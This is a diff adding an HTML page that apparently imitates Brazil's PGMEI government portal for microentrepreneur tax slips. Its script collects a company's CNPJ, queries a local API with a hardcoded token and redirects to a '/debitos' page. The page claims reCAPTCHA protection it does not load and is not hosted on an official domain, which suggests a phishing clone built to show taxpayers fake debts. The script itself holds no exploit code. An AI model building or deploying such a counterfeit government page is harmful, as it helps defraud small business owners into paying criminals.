@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/all.min.css">
+    <title>PG-ME-I - Programa</title>
+</head>
+<body>
+    <div class="div1">
+        <div class="top-bar"></div>
+        <div class="divalto">
+            <div class="badge">
+                <img src="/images/logo2.png" alt="Logo">
+                <a href="#">PGMEI</a>
+            </div>
+            <div class="subtitle">Programa Gerador de DAS do Microempreendedor Individual</div>
+        </div>
+        <div class="card-container">
+            <div class="card-header">Informe o número completo do CNPJ</div>
+            <div class="card-body">
+                <label for="cnpj">CNPJ completo:</label>
+                <input type="text" id="cnpj" placeholder="__.___.___/____-__" autocomplete="off">
+                <small><a style="color:black;">Protegido por reCAPTCHA</a><br>
+                <a style="color:#4d87bc;">Privacidade e Termos e condições.</a></small>
+                <button type="button" id="buscar">Continuar</button>
+            </div>
+        </div>
+    </div>
+    <div class="div2">
+        <div class="div-sobre">
+            <div class="versao">Versão: 3.15.1</div>
+            <img src="/images/logo3.png" alt="Logo" class="logo">
+        </div>
+    </div>
+    <script src="/js/api-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const cnpjInput = document.getElementById('cnpj');
+            const btn = document.getElementById('buscar');
+            const TOKEN = 'vias';
+
+            cnpjInput.addEventListener('input', function () {
+                let value = cnpjInput.value.replace(/\D/g, '');
+                if (value.length > 14) value = value.slice(0, 14);
+                let f = '';
+                if (value.length > 2) f += value.slice(0, 2) + '.';
+                else f += value;
+                if (value.length > 5) f += value.slice(2, 5) + '.';
+                else if (value.length > 2) f += value.slice(2);
+                if (value.length > 8) f += value.slice(5, 8) + '/';
+                else if (value.length > 5) f += value.slice(5);
+                if (value.length > 12) f += value.slice(8, 12) + '-';
+                else if (value.length > 8) f += value.slice(8);
+                if (value.length > 12) f += value.slice(12);
+                cnpjInput.value = f;
+            });
+
+            btn.addEventListener('click', async function (e) {
+                e.preventDefault();
+                const cnpj = cnpjInput.value.replace(/\D/g, '');
+                if (cnpj.length !== 14) {
+                    alert('Digite um CNPJ válido!');
+                    return;
+                }
+
+                btn.innerHTML = "<span class='loader'></span>";
+                btn.disabled = true;
+
+                try {
+                    const data = await apiFetch(`/api/cnpj?cnpj=${encodeURIComponent(cnpj)}&token=${TOKEN}`);
+
+                    if (data.error) {
+                        alert(data.error || 'CNPJ não encontrado.');
+                        return;
+                    }
+
+                    if (data.cnpj && data.nomeEmpresarial) {
+                        const anosList = Array.isArray(data.anos) ? data.anos.map(Number).filter(a => a >= 2000) : [];
+                        const qs = new URLSearchParams({
+                            cnpj: String(data.cnpj).replace(/\D/g, ''),
+                            nomeEmpre: data.nomeEmpresarial,
+                            token: TOKEN
+                        });
+                        if (anosList.length) qs.set('anos', anosList.join(','));
+                        window.location.href = '/debitos?' + qs.toString();
+                    } else {
+                        alert('Não foi possível buscar os dados do CNPJ!');
+                    }
+                } catch (err) {
+                    alert('Erro na requisição: ' + err.message);
+                } finally {
+                    btn.innerHTML = 'Continuar';
+                    btn.disabled = false;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
